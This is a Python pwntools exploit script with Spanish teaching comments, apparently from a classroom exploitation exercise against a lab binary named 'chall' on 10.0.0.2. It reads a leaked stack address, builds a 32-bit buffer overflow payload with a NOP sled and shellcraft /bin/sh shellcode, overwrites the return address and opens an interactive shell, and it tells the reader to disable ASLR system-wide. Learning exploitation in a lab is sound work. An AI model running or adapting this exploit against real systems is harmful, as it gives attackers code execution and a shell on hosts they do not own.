#!/usr/bin/python3
##############################
# En este ejercicio inyectamos una shellcode en el buffer.
# Después controlamos la dirección de retorno mediante el desbordamiento para apuntar a la shellcode.
# Se hace un leak de la dirección del buffer para ayudar a entender el exploit.
# Si no hay leak, se tiene que desactivar ASLR, de otra forma la pila cambiará de ubicación en cada ejecución.
# Desactivar ASLR
# echo 0 | sudo tee /proc/sys/kernel/randomize_va_space
#
# Intenta ejecutar el exploit sin usar el leak, desactivando ASLR y calculando de forma manual la dirección de la pila
##############################
from pwn import *
elf = context.binary = ELF("chall")
libc = elf.libc
HOST = "10.0.0.2" #"www.iesvirgendelcarmen.com"
PORT = 10005

gs = '''
b start_level
'''
def start():
    """
    Si ejecutamos:$ xpl.py sin parámetros io.sendXXX para enviar datos por entrada estandar al proceso. io.recXXX para leer datos salida estandar del proceso.
    Si ejecutamos:$ xpl.py GDB se abre una nueva ventana con el depurador
    Si ejecutamos:$ xpl.py REMOTE se abre un socket con servidor remoto. La entrada y salida funciona igual que en local.
    """
    if args.GDB:
        return gdb.debug(elf.path, gdbscript=gs)
    if args.REMOTE:
	    return remote(HOST, PORT)
    else:
        return process(elf.path)

io = start()
#Lee de la salida estandar hasta Leak:
io.recvuntil('********************************|')
#Lee de la salida estandar hasta retorno de carro
leak = io.recvuntil('|',True)
#Convierte la dirección de memoria robada, que es un string, a un entero. La dirección de memoria está en base 16 (hexadecimal).
leak = int(leak, 16)
print(hex(leak))
log.info('Enviando shellcode')

#Usamos una shellcode de shellcraft. Shellcodes que vienen en pwntools
print(shellcraft.i386.linux.sh())
#Usamos un colchón de NOPS para incrementar la probabilidad de ejecución de la shellcode.
shellcode = asm("NOP;"*500+shellcraft.i386.linux.sh())
#Otra fuente común de shellcodes es: shell-storm.org

#Generamos un payload en little endian para 32 bits
payload = flat (
        b"A"*(0x80),
        p32(leak+200), #El colchón de NOPS permite no tener que ajustar el cálculo.
        shellcode,
        endianness = 'little', word_size = 32, sign = False
    )
#Enviamos el payload
io.sendline(payload)
io.sendline("+")
io.sendline("1")
#Hacemos la sesión interactiva (entrada y salida estandar)
io.interactive()
